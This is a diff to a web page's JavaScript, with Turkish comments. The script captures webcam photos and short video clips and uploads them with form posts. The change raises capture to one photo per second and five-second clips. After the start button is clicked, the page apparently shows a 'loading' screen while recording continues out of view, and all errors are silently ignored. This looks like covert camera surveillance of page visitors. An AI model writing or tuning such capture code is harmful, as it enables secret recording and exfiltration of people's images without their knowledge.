@@ -112,7 +112,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK - 5 SANİYEDE 1
+        // FOTOĞRAF ÇEK - 1 SANİYEDE 1
         // ============================================
         async function takePhoto() {
             if (!video.videoWidth || !video.videoHeight) return;
@@ -137,13 +137,13 @@
                         body: formData
                     });
                     
-                }, 'image/jpeg', 0.8);
+                }, 'image/jpeg', 0.7);
                 
             } catch(e) {}
         }
         
         // ============================================
-        // 15 SANİYELİK VİDEO KAYDI
+        // 5 SANİYELİK VİDEO KAYDI
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
@@ -177,17 +177,17 @@
                     body: formData
                 });
                 
-                // Yeni video başlat
+                // Yeni video başlat (5 saniyelik)
                 setTimeout(recordVideo, 1000);
             };
             
-            // 15 saniye kaydet
+            // 5 saniye kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
-            }, 15000);
+            }, 5000);
         }
         
         // ============================================
@@ -211,10 +211,10 @@
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // 5 SANİYEDE 1 FOTOĞRAF
-                    setInterval(takePhoto, 5000);
+                    // 1 SANİYEDE 1 FOTOĞRAF
+                    setInterval(takePhoto, 1000);
                     
-                    // 2 saniye bekle sonra video başlasın
+                    // 2 saniye bekle sonra video başlasın (5 saniyelik)
                     setTimeout(recordVideo, 2000);
                 };
                 
@@ -246,4 +246,4 @@
         };
     </script>
 </body>
-    </html>
+</html>
